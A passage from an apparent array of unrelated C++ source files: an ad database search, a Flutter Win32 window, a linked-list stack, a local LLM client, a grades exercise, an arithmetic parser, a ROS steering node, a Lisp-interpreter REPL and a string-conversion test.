\u041e\u0447\u0438\u0449\u0430\u0435\u043c \u0442\u0435\u043a\u0443\u0449\u0435\u0435 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u0434\u043b\u044f \u0447\u0442\u0435\u043d\u0438\u044f \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0435\u0433\u043e\n            }\n        }\n        file_r.close();\n        return ads;\n    }\n    vector<vector<string>> getAllAdsByPrice(string price, string max_price) {\n        ifstream file_r(this->DB);\n        vector<vector<string>> ads; // \u0421\u043e\u0437\u0434\u0430\u0435\u043c \u0432\u0435\u043a\u0442\u043e\u0440 \u0432\u0435\u043a\u0442\u043e\u0440\u043e\u0432 \u0441\u0442\u0440\u043e\u043a \u0434\u043b\u044f \u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0439\n        string line;\n        vector<string> currentAd; // \u0422\u0435\u043a\u0443\u0449\u0435\u0435 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435\n        while (getline(file_r, line)) { // \u0427\u0438\u0442\u0430\u0435\u043c \u0441\u0442\u0440\u043e\u043a\u0438 \u0438\u0437 \u0444\u0430\u0439\u043b\u0430\n            currentAd.push_back(line);// \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u0441\u0442\u0440\u043e\u043a\u0443 \u0432 \u0442\u0435\u043a\u0443\u0449\u0435\u0435 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435\n            if (currentAd.size() == 11) {\n                string digits_current_ad;\n                string digits_price;\n                string digits_max_price;\n                for (char c : currentAd[4]) {\n                    if (isdigit(c)) {\n                        digits_current_ad += c;\n                    }\n                }\n                for (char c : price) {\n                    if (isdigit(c)) {\n                        digits_price += c;\n                    }\n                }\n                for (char c : max_price) {\n                    if (isdigit(c)) {\n                        digits_max_price += c;\n                    }\n                }\n                if (currentAd[8] == \"1\" && (stoi(digits_current_ad)>=stoi(digits_price)&& stoi(digits_current_ad) <= stoi(digits_max_price))) {// \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043d\u0430 \u0442\u043e, \u044f\u0432\u043b\u044f\u0435\u0442\u0441\u044f \u043b\u0438 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u0430\u043a\u0442\u0438\u0432\u043d\u044b\u043c\n                    ads.push_back(currentAd);// \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u0432 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0438\u0440\u0443\u044e\u0449\u0438\u0439 \u0432\u0435\u043a\u0442\u043e\u0440\n                }\n                currentAd.clear(); // \u041e\u0447\u0438\u0449\u0430\u0435\u043c \u0442\u0435\u043a\u0443\u0449\u0435\u0435 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u0434\u043b\u044f \u0447\u0442\u0435\u043d\u0438\u044f \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0435\u0433\u043e\n            }\n        }\n        file_r.close();\n        return ads;\n    }\n    vector<vector<string>> getAllAdsByPlace(string place) {\n        ifstream file_r(this->DB);\n        vector<vector<string>> ads; // \u0421\u043e\u0437\u0434\u0430\u0435\u043c \u0432\u0435\u043a\u0442\u043e\u0440 \u0432\u0435\u043a\u0442\u043e\u0440\u043e\u0432 \u0441\u0442\u0440\u043e\u043a \u0434\u043b\u044f \u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0439\n        string line;\n        vector<string> currentAd; // \u0422\u0435\u043a\u0443\u0449\u0435\u0435 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435\n        while (getline(file_r, line)) { // \u0427\u0438\u0442\u0430\u0435\u043c \u0441\u0442\u0440\u043e\u043a\u0438 \u0438\u0437 \u0444\u0430\u0439\u043b\u0430\n            currentAd.push_back(line);// \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u0441\u0442\u0440\u043e\u043a\u0443 \u0432 \u0442\u0435\u043a\u0443\u0449\u0435\u0435 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435\n            if (currentAd.size() == 11) { // \u0415\u0441\u043b\u0438 \u0432 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0438 \u0443\u0436\u0435 11 \u0441\u0442\u0440\u043e\u043a\n                if",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\nusing namespace std;\nstruct node\n{\n\tint Data;\n\tnode* next;\n};\n\n// global pointer\nnode* TOP = NULL;\nnode* current = NULL;\n\nbool isEmpty()\n{\n\tif (TOP == NULL)\n\t\treturn true;\n\telse\n\t\treturn false;\n}\nvoid push(int newdata)\n{\n\tnode* current = new node();\n\tcurrent->Data = newdata;\n\tif (!isEmpty())\n\t{\n\t\tcurrent->next = TOP;\n\t\tTOP = current;\n\t}\n\telse\n\t{\n\t\tTOP = current;\n\t\tTOP->next = NULL;\n\t}\n}\nvoid pop()\n{\n\tif (!isEmpty())\n\t{\n\t\tcurrent = TOP;\n\t\tTOP = TOP->next;\n\t\tdelete current;\n\t}\n\telse\n\t\tcout << \"No stack found\" << endl;\n}\nvoid popAll()\n{\n\twhile (!isEmpty())\n\t{\n\t\tcurrent = TOP;\n\t\tTOP = TOP->next;\n\t\tdelete current;\n\t}\n}\nvoid display()\n{\n\tif (!isEmpty())\n\t{\n\t\tcurrent = TOP;\n\t\twhile (current != NULL)\n\t\t{\n\t\t\tcout << current->Data << endl;\n\t\t\tcurrent = current->next;\n\t\t}\n\t}\n\telse cout << \"There is no data in the Stack\\n\";\n}\nvoid app()\n{\n\t/*\n\t\top -> operation\n\t\tc -> confirm\n\t\tp -> push node\n\t\tao -> another operation\n\t\ts -> starter app\n\t*/\n\t\tint op, c, p, ao, s;\n\tcout << \"--- Welcome to stack implementation---\\n\";\n\tdo\n\t{\n\t\tcout << \"Choise what do you want\\n\";\n\t\tcout << \"Push -> (1)\\n\";\n\t\tcout << \"Pop an Elements -> (2) \\n\";\n\t\tcout << \"POP All Elements -> (3)\\n\";\n\t\tcout << \"Display -> (4)\\n\";\n\t\tcout << \"Exit -> (5)\\n\";\n\t\tcin >> op;\n\t\tswitch (op)\n\t\t{\n\t\tcase 1:\n\t\t\tcout << \"Enter value do you want to push \\n\";\n\t\t\tcin >> p;\n\t\t\tpush(p);\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\tcout << \"Are you sure to pop one node\\n\";\n\t\t\tcout << \"To Confirm Enter -> (1)\\n\";\n\t\t\tcout << \"To Cancel Enter -> any key\\n\";\n\t\t\tcin >> c;\n\t\t\tif (c == 1)\n\t\t\t{\n\t\t\t\tpop();\n\t\t\t\tcout << \"\\nCheck data of stack after poping first node : \\n \";\n\t\t\t\tdisplay();\n\t\t\t}\n\t\t\telse {\n\t\t\t\tcout << \"Pop is canceled\\n\";\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 3:\n\t\t\tcout << \"Are you sure to pop all nodes\\n\";\n\t\t\tcout << \"To Confirm Enter -> (1)\\n\";\n\t\t\tcout << \"To Cancel Enter -> any key\\n\";\n\t\t\tcin >> c;\n\t\t\tif (c == 1)\n\t\t\t{\n\t\t\t\tpopAll ();\n\t\t\t\tcout << \"\\nCheck data of stack after poping all nodes : \\n \";\n\t\t\t\tdisplay();\n\t\t\t}\n\t\t\telse {\n\t\t\t\tcout << \"Pop all is canceled\\n\";\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 4:\n\t\t\tcout << \"Pushed Elements are:\\n\";\n\t\t\tdisplay();\n\t\t\tbreak;\n\t\tcase 5:\n\t\t\treturn;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tcout << \"Wrong Input Try Again\\n\";\n\t\t}\n\t\tcout << \"Do you want another opration\\n\";\n\t\tcout << \"Yes -> 1 \\n\";\n\t\tcout << \"NO -> any key \\n\";\n\t\tcin >> ao;\n\t} while (ao == 1);\n}\nint main()\n{\n\tapp();\n\treturn 0;\n}",
    "//\n//  AIClient.cpp\n//  AIBookEngine\n//\n//  Created by Armando Meabe on 07/05/2024.\n//\n\n#include \"AIClient.hpp\"\n\nAIClient::AIClient() { };\n\nstd::string AIClient::Generate(const std::string &text) {\n    // Inicializa CURL globalmente.\n    curl_global_init(CURL_GLOBAL_DEFAULT);\n    \n    // Preprocesamiento\n    auto sanitizedDescription = TextUtils::processText(text);\n\n    auto skillSet = new Skill(); //heap: just for fun.\n    // std::string prompt = skillSet->applySkill(\"extractKeywords\", sanitizedDescription);\n    std::string prompt = skillSet->applySkill(\"extractTLDR\", sanitizedDescription);\n    \n    // Instancia de la clase CurlHelper\n    CurlHelper curlHelper;\n\n    // Crea el cuerpo de la solicitud JSON.\n    string jsonBody = curlHelper.createChatJsonBody(\"phi3\", prompt);\n    \n    // Configura CURL con las opciones necesarias y realiza la solicitud.\n    string serverResponse = curlHelper.setupCurl(jsonBody, \"http://localhost:11434/api/generate\", true); // Almacenamos la respuesta del servidor.\n//    string serverResponse = curlHelper.setupCurl(jsonBody, \"http://192.168.100.100:11434/api/generate\", true); // Almacenamos la respuesta del servidor.\n\n    // Limpia CURL globalmente.\n    curl_global_cleanup();\n\n    // Liberar la memoria si uso 'new' para crear objetos.\n    delete skillSet;\n\n    // Devuelve la respuesta completa.\n    return serverResponse;\n};\n\nEmbedding AIClient::Embed(const std::string &text) {\n    // Inicializa CURL globalmente.\n    curl_global_init(CURL_GLOBAL_DEFAULT);\n    \n    // Instancia de la clase CurlHelper\n    CurlHelper curlHelper;\n\n    // Crea el cuerpo de la solicitud JSON.\n    string jsonBody = curlHelper.createEmbeddingJsonBody(\"nomic-embed-text\", text);\n    \n    // Configura CURL con las opciones necesarias y realiza la solicitud.\n    string serverResponse = curlHelper.setupCurl(jsonBody, \"http://localhost:11434/api/embeddings\", false); // Almacenamos la respuesta del servidor.\n    \n    // Limpia CURL globalmente.\n    curl_global_cleanup();\n\n    auto embedding_instance = Embedding::from_json_string(serverResponse);\n    embedding_instance.originalText = text;\n    \n    return embedding_instance;\n};\n",
    "/*Para un grupo de clase de 8 estudiantes, realice un programa que\npermita calcular y dar como salida lo siguiente:\n\u2713 Cantidad de alumnos aprobados\n\u2713 Cantidad de alumnos reprobados\n\u2713 Promedio general del grupo*/\n\n//sin copilot\n\n#include<iostream>\nusing namespace std;\n\nfloat nota, suma=0, promedio;\nint aprobados, reprobados;\n\nint main()\n{\n    for(int i=1; i<=10; i++)\n    {\n        cout<<\"Ingrese la nota del estudiante \"<<i<<\": \";\n        cin>>nota;\n        suma+=nota;\n        if (nota <70)\n        {\n            reprobados += 1; \n        }else aprobados += 1;\n    }\n    promedio=suma/10;\n    cout<<\"El promedio general de la seccion es: \"<<promedio<<endl;\n    cout<<\"La cantidad de alumnos aprobados son: \"<<aprobados<<endl;\n    cout<<\"La cantidad de alumnos reprobados son: \"<<reprobados<<endl;\n    return 0;\n}\n\n//con copilot\n\n/*#include<iostream>\nusing namespace std;\n\nfloat nota, suma=0, promedio;\n\nint main()\n{\n    int aprobados = 0, reprobados = 0;\n    for(int i=1; i<=10; i++)\n    {\n        cout<<\"Ingrese la nota del estudiante \"<<i<<\": \";\n        cin>>nota;\n        suma+=nota;\n        if (nota <70)\n        {\n            reprobados += 1; \n        }else aprobados += 1;\n    }\n    promedio=suma/10;\n    cout<<\"El promedio general de la seccion es: \"<<promedio<<endl;\n    cout<<\"La cantidad de alumnos aprobados son: \"<<aprobados<<endl;\n    cout<<\"La cantidad de alumnos reprobados son: \"<<reprobados<<endl;\n    return 0;\n}*/",
    "/*\n * AritMix - Analisador de expressoes aritmeticas In-Fixas.\n * Prof.: Cleuton Sampaio\n * (ANSI C++ com C++ Standard Template Library)\n *\n * Vers\u00e3o atual: 1.0 - Marco 2003\n *\n * Operadores aritmeticos:\n *     \"+\" -> Soma\n *     \"-\" -> Subtracao\n *     \"*\" -> Multiplicao\n *     \":\" -> Divisao\n *     \"^\" -> Exponenciao\n *\n * Aceita parentesis\n *\n * Casos de teste (ja\ufffd calculados):\n * 1+2 = 3\n * 1--3 = ERRO!\n * ((5-3) * (2*3) -1) = 11\n * 1:(5^(3-2)+1) = 0,166666667\n * 4^(1:2) = 2\n * ((1 + 2) * (6/2)) = ERRO!\n * (1+2)^((4-2) * (1+2)) = 729\n * -3 *(-2*5)^2 = -300\n *\n * Uso: aritmix [opcoes]\n * -d = debug: imprimir calculos e pilha\n * -t = executar os testes: roda as expressoes de teste acima.\n *\n */\n\n#include <iostream>\n#include <sstream>\n#include <string>\n#include <stack>\n#include <vector>\n#include <cctype>\n#include <cmath>\n\nusing namespace std;\n\nbool debug = false;\nbool runTests = false;\n\n#define DEBUG(msg) if (debug) cout << endl << msg << endl;\n#define ERRO(msg) cout << endl << \"**** ERRO: \" << msg << endl;\n\n\n\ntypedef struct elementoStruct {\n        bool fim;\n        bool erro;\n        bool eOperando;\n        double operando;\n        bool eOperador;\n        char operador;} TElemento;\n\nstack <double> pilha;\nvector <TElemento> listaPosFixa;\nstack <char> pilhaOperadores;\n\nvoid parseArgs(int qtde, char* args[]) {\n     for (int x = 0; x < qtde; x++) {\n         string arg (args[x]);\n         if (arg == \"-d\") {\n            debug = true;\n         }\n         if (arg == \"-t\") {\n        \t runTests = true;\n         }\n     }\n}\n\nvoid posfixa ( double operando ) {\n       pilha.push(operando);\n}\n\n\nvoid posfixa ( char operador ) {\n       double op2 = pilha.top();\n       pilha.pop();\n       double op1 = pilha.top();\n       pilha.pop();\n       double resultado = 0.0;\n       stringstream ss1;\n       string msg;\n       if (operador == '+') {\n          resultado = op1 + op2;\n       }\n       else if (operador == '*') {\n               resultado = op1 * op2;\n            }\n            else if (operador == ':' || operador == '/') {\n                    resultado = op1 / op2;\n                 }\n                 else if (operador == '^') {\n                         resultado = pow(op1,op2);\n                      }\n                      else  if (operador == '-') {\n                               resultado = op1 - op2;\n                            }\n                            else if (operador == '^') {\n                            \t\tresultado = pow(op1,op2);\n                            }\n                            else {\n                                 ERRO(\"**** Operador invalido: \" + operador);\n                                 return;\n                            }\n       ss1 << \"CALCULAR: \" << operador\n                          << \"(\" << op1 << \", \" << op2\n                          << \")\" << \" = \" << resultado;\n       getline(ss1, msg);\n       DEBUG(msg);\n\n       pilha.push(resultado);\n}\n\nbool isOperador ( char pos ) {\n     bool retorno = false;\n     if (pos == '+' || pos == '-' || pos == '^' ||\n         pos == '*' || pos == ':' || pos == '/' ||\n         pos == '^' ||\n         pos == '(' || pos == ')') {\n         retorno = true;\n     }\n     return (retorno);\n}\n\nTElemento parse (string expressao, int &posicao) {\n       TElemento elem = {false, false, false, 0.0, false, 0};\n       string operando = \"\";\n\n       stringstream stream;\n       while (true) {\n             if ((unsigned) posicao >= expressao.length()) {\n                if (operando.length() > 0) {\n                   stream << operando;\n                   stream >> elem.operando;\n                   elem.eOperando = true;\n                   break;\n                }\n                elem.fim = true;\n                break;\n             }\n             if (isdigit(expressao[posicao]) || expressao[posicao] == '.') {\n                operando += expressao[posicao];\n                posicao++;\n             }\n             else if (isOperador(expressao[posicao])) {\n\n                     if (operando.length() > 0) {\n                        // retorna o operando\n                        stream << operando;\n                        stream >> elem.operando;\n                        elem.eOperando = true;\n                        break;\n                     }\n                     else {\n                          // retorna o operador\n                          elem.eOperador = true;\n                          elem.operador = expressao[posicao];\n                          posicao++;\n                          break;\n                     }\n                  }\n                  else {\n                       // \u00e9 whitespace\n                \t  if (!isspace(expressao[posicao]) ) {\n                \t\t  cout << endl << \"**** ERRO: caracter invalido na expressao: \"\n                \t\t  \t   << expressao[posicao] << \" na posicao: \" << posicao <<\n                \t\t  \t   endl << \"[[\" << expressao << \"]]\";\n\n                \t\t  elem.erro = true;\n                \t\t  break;\n                \t  }\n                \t  posicao++",
    "#include <ros/ros.h>\n#include <geometry_msgs/Twist.h>\n#include <geometry_msgs/Point.h>\n#include <visualization_msgs/Marker.h>\n\nusing namespace std;\n\nros::Publisher car_control_pub;\nros::Publisher rviz_target_point_pub;\n\nfloat car_steering_rad = 0.0;\ndouble deg2rad = M_PI/180;\ndouble rad2deg = 180/M_PI;\ndouble car_pos_x, car_pos_y = 0.0;\n\n//////////////////////////////////////////////////////////\nstd::pair<double ,double> target_point = {5.0, 2.76756905};     //{X, Y}  unit : [m]\n        \ndouble car_velocity = 0.3;                                      //unit : [m/s]\n/////////////////////////////////////////////////////////\n\nfloat Calculate_steering()\n{\n    double dx = (target_point.first - car_pos_x);\n    double dy = (target_point.second - car_pos_y);\n\n    double dist = sqrt(dx*dx + dy*dy);\n\n    double alpha = atan2(dy, dx);\n\n    float steering_rad = alpha;\n    \n    return steering_rad;\n}\n\nvoid Car_pos_Callback(const geometry_msgs::Point::ConstPtr &car_pos)\n{\n    car_pos_x = car_pos->x;\n    car_pos_y = car_pos->y; \n}\n\nvoid Publish_control_value()\n{\n    geometry_msgs::Twist car_control;\n\n    car_control.linear.x = car_velocity;\n    car_control.angular.z = car_steering_rad;\n\n    car_control_pub.publish(car_control);\n}\n\nvoid Rviz_target_point()\n{\n    visualization_msgs::Marker t_point;\n\n    t_point.header.frame_id = \"edu_frame\";\n    t_point.header.stamp = ros::Time::now();\n    t_point.ns = \"target_point\";\n    t_point.id = 0;\n    t_point.type = visualization_msgs::Marker::SPHERE;\n    t_point.action = visualization_msgs::Marker::ADD;\n    t_point.lifetime = ros::Duration(0.2);\n\n    t_point.pose.position.x = target_point.first;\n    t_point.pose.position.y = target_point.second;\n    t_point.pose.position.z = 0;\n\n    t_point.scale.x = 0.3;\n    t_point.scale.y = 0.3;\n    t_point.scale.z = 0.0;\n\n    t_point.color.r = 0.0;      \n    t_point.color.g = 1.0;     \n    t_point.color.b = 0.0;\n    \n    t_point.color.a = 1.0;\n\n    rviz_target_point_pub.publish(t_point);\n}\n\nint main(int argc, char **argv)\n{\n\tros::init(argc, argv, \"edu_angle_steering_node\");\n\tros::NodeHandle nh;\n\n    ros::Rate loop(8);\n\n    ros::Subscriber car_position_sub = nh.subscribe<geometry_msgs::Point>(\"/car_position\", 10, &Car_pos_Callback);\n\n    car_control_pub = nh.advertise<geometry_msgs::Twist> (\"/control_value\", 10);\n    rviz_target_point_pub = nh.advertise<visualization_msgs::Marker> (\"/rviz_target_point\", 10);\n\n    geometry_msgs::Twist car_control;\n\n\twhile(ros::ok())\n    {\t\n        car_steering_rad = Calculate_steering();\n\n        Publish_control_value();\n\n        Rviz_target_point();\n\t\t\n        cout << \"Target point position(X, Y)[m]\" << endl;\n        cout << target_point.first << \", \" << target_point.second << endl;\n        cout << \" \" << endl;\n\t\n        cout << \"Car velocity[m/s] : \" << car_velocity << endl;\n        cout << \"Car steering[deg] : \" << car_steering_rad*rad2deg << endl;\n        cout << \" \" << endl;\n\n        cout << \"Car position(X, Y)[m]\" << endl;\n        cout << car_pos_x << \", \" << car_pos_y << endl;\n        cout << \" \" << endl;\n\n        cout << \"****************************\" << endl;\n        cout << \" \" << endl;\n\n        loop.sleep();\n\n\t\tros::spinOnce();\n\t}\n\t\n    return 0;\n}\n",
    "#include \"Env.hpp\"\n#include \"Reader.hpp\"\n#include \"printer.hpp\"\n#include \"readline.hpp\"\n\nstatic MalType *READ(const String &s)\n{\n\treturn read_str(s);\n}\n\nstatic const String PRINT(MalType *ast)\n{\n\treturn pr_str(ast, true);\n}\n\nstatic void rep(const String &s, Env &env)\n{\n\ttry {\n\t\tauto in = std::unique_ptr<MalType>(READ(s));\n\t\tauto out = std::unique_ptr<MalType>(EVAL(in.get(), env));\n\t\tif (out.get())\n\t\t\tstd::cout << PRINT(out.get()) << std::endl;\n\t\telse\n\t\t\tstd::cerr << \"error during execution\"\n\t\t\t\t  << std::endl; // TODO better error handling\n\t} catch (std::invalid_argument &e) {\n\t\tstd::cerr << \"error during execution: \" << e.what()\n\t\t\t  << std::endl;\n\t}\n}\n\nstatic void init_env(StringVec &binds, MalList *exprs)\n{\n\tbinds.push_back(\"+\");\n\texprs->add(new MalFunc([](MalList *list) -> MalType * {\n\t\tint ret = 0;\n\t\tfor (std::size_t i = 1; i < list->list.size(); i++) {\n\t\t\tconst auto e = list->list[i].get();\n\t\t\tif (e->type != MalType::NUMBER)\n\t\t\t\tthrow std::invalid_argument(\n\t\t\t\t    \"not a number on symbol '+'\");\n\t\t\tret += static_cast<MalNumber *>(e)->value;\n\t\t}\n\t\treturn new MalNumber(ret);\n\t}));\n\tbinds.push_back(\"-\");\n\texprs->add(new MalFunc([](MalList *list) -> MalType * {\n\t\tint ret = 0;\n\t\tfor (std::size_t i = 1; i < list->list.size(); i++) {\n\t\t\tconst auto e = list->list[i].get();\n\t\t\tif (e->type != MalType::NUMBER)\n\t\t\t\tthrow std::invalid_argument(\n\t\t\t\t    \"not a number on symbol '-'\");\n\t\t\tconst auto nb = static_cast<MalNumber *>(e)->value;\n\t\t\tif (i == 1)\n\t\t\t\tret = nb;\n\t\t\telse\n\t\t\t\tret -= nb;\n\t\t}\n\t\treturn new MalNumber(ret);\n\t}));\n\tbinds.push_back(\"*\");\n\texprs->add(new MalFunc([](MalList *list) -> MalType * {\n\t\tint ret = 0;\n\t\tfor (std::size_t i = 1; i < list->list.size(); i++) {\n\t\t\tconst auto e = list->list[i].get();\n\t\t\tif (e->type != MalType::NUMBER)\n\t\t\t\tthrow std::invalid_argument(\n\t\t\t\t    \"not a number on symbol '*'\");\n\t\t\tif (i == 1)\n\t\t\t\tret = 1;\n\t\t\tret *= static_cast<MalNumber *>(e)->value;\n\t\t}\n\t\treturn new MalNumber(ret);\n\t}));\n\tbinds.push_back(\"/\");\n\texprs->add(new MalFunc([](MalList *list) -> MalType * {\n\t\tint ret = 0;\n\t\tfor (std::size_t i = 1; i < list->list.size(); i++) {\n\t\t\tconst auto e = list->list[i].get();\n\t\t\tif (e->type != MalType::NUMBER)\n\t\t\t\tthrow std::invalid_argument(\n\t\t\t\t    \"not a number on symbol '/'\");\n\t\t\tconst auto nb = static_cast<MalNumber *>(e)->value;\n\t\t\tif (i != 1 && nb == 0)\n\t\t\t\treturn new MalNil();\n\t\t\tif (i == 1)\n\t\t\t\tret = nb;\n\t\t\telse\n\t\t\t\tret /= nb;\n\t\t}\n\t\treturn new MalNumber(ret);\n\t}));\n}\n\nint main(void)\n{\n\tString s;\n\tStringVec binds;\n\tauto exprs = std::unique_ptr<MalList>(new MalList());\n\tinit_env(binds, exprs.get());\n\tEnv env(NULL, binds, exprs.get());\n\twhile (Readline(String{std::getenv(\"USER\")} + \"> \", s))\n\t\trep(s, env);\n\trl_uninitialize();\n\treturn 0;\n}\n",
    "#include <Wx32/APIs.h>\n#include <stdexcept>\n\nstatic auto TestStr()\n{\n\t// mbcs to widestr\n\t{\n\t\twchar_t buffer[100]{};\n\t\tauto wide_str_buffer_sv = Wx32::Utils::StrCvtForce(Wx32::Utils::ForceU8Str(u8\"\u8fd9\u662f\u4e00\u6bb5\u4e2d\u6587\"), buffer, Wx32::CodePage::UTF8);\n\t\tWx32::WideStr_t wide_str_force = Wx32::Utils::StrCvtForce(Wx32::Utils::ForceU8Str(u8\"\u8fd9\u662f\u4e00\u6bb5\u4e2d\u6587\"), Wx32::CodePage::UTF8);\n\t\tWx32::WideStr_t wide_str_safe = Wx32::Utils::StrCvtSafe(Wx32::Utils::ForceU8Str(u8\"\u8fd9\u662f\u4e00\u6bb5\u4e2d\u6587\"), Wx32::CodePage::UTF8);\n\t\tif (wide_str_force.first != L\"\u8fd9\u662f\u4e00\u6bb5\u4e2d\u6587\") { return false; }\n\t\tif (wide_str_safe.first != L\"\u8fd9\u662f\u4e00\u6bb5\u4e2d\u6587\") { return false; }\n\t\tif (wide_str_buffer_sv != L\"\u8fd9\u662f\u4e00\u6bb5\u4e2d\u6587\") { return false; }\n\n\t\ttry\n\t\t{\n\t\t\twchar_t buffer_small[2]{};\n\t\t\tauto wide_str_buffer_sm_sv = Wx32::Utils::StrCvtForce(Wx32::Utils::ForceU8Str(u8\"\u8fd9\u662f\u4e00\u6bb5\u4e2d\u6587\"), buffer_small, Wx32::CodePage::UTF8);\n\t\t}\n\t\tcatch (const std::runtime_error& err)\n\t\t{\n\t\t\tif (::strcmp(err.what(), \"ApiStrCvt: buffer too small\"))\n\t\t\t{\n\t\t\t\treturn false;\n\t\t\t}\n\t\t}\n\t}\n\n\t// widestr to mbcs\n\t{\n\t\tWx32::MbcsStr_t mbc_str0_force = Wx32::Utils::StrCvtForce(L\"\u8fd9\u662f\u4e00\u6bb5\u4e2d\u6587\", Wx32::CodePage::UTF8);\n\t\tWx32::MbcsStr_t mbc_str0_safe = 